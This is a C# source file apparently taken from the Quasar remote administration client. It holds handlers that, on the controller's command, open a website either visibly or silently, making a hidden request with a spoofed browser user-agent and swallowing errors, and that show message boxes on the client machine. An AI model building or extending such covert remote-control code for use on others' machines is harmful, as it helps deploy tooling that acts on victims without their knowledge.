using Quasar.Common.Messages;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDoVisitWebsite(DoVisitWebsite command, Networking.Client client)
        {
            string url = command.Url;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                client.Send(new SetStatus {Message = "Visited Website"});
            }
        }

        public static void HandleDoShowMessageBox(DoShowMessageBox command, Networking.Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(command.Text, command.Caption,
                    (MessageBoxButtons) Enum.Parse(typeof(MessageBoxButtons), command.Button),
                    (MessageBoxIcon) Enum.Parse(typeof(MessageBoxIcon), command.Icon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            client.Send(new SetStatus {Message = "Showed Messagebox"});
        }
    }
}